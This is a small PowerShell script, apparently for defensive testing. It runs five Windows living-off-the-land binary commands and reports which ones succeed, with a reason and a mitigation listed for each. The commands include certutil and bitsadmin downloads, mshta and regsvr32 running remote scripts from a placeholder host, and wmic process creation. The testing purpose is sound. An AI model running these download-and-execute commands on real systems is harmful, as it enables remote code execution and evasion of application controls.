# lolbas_tester.ps1
# Simple LOLBAS tester script

# Create an array of test commands with explanation
$tests = @(
    @{
        Command = "certutil -urlcache -split -f https://example.com/file.txt file.txt"
        Why = "Can download malicious files over HTTP"
        Mitigation = "Block certutil.exe for standard users"
    },
    @{
        Command = "bitsadmin /transfer myJob https://example.com/file.txt file.txt"
        Why = "Transfers files silently, often overlooked"
        Mitigation = "Block or audit bitsadmin"
    },
    @{
        Command = "mshta https://example.com/malware.hta"
        Why = "Executes remote scripts, can bypass defenses"
        Mitigation = "Block mshta.exe with AppLocker"
    },
    @{
        Command = "regsvr32 /s /n /u /i:https://example.com/file.sct scrobj.dll"
        Why = "Runs remote scriptlets (SCT), no disk footprint"
        Mitigation = "Block regsvr32 or restrict internet access"
    },
    @{
        Command = "wmic process call create 'calc.exe'"
        Why = "Can execute any command or script"
        Mitigation = "Limit wmic usage with group policies"
    }
)

# Create result markdown
$report = @"
# LOLBAS Test Report

| Command | Status | Why it's dangerous | How to mitigate |
|--------|--------|--------------------|-----------------|
"@

# Loop through tests
foreach ($test in $tests) {
    try {
        # Try to execute the command
        Invoke-Expression $test.Command
        $status = "✅ Passed"
    } catch {
        $status = "❌ Failed"
    }

    # Add to markdown table
    $report += "`n| $($test.Command) | $status | $($test.Why) | $($test.Mitigation) |"
}

# Save to results/report.md
$report | Out-File -FilePath "../results/report.md" -Encoding utf8

Write-Host "Done! See results/report.md"
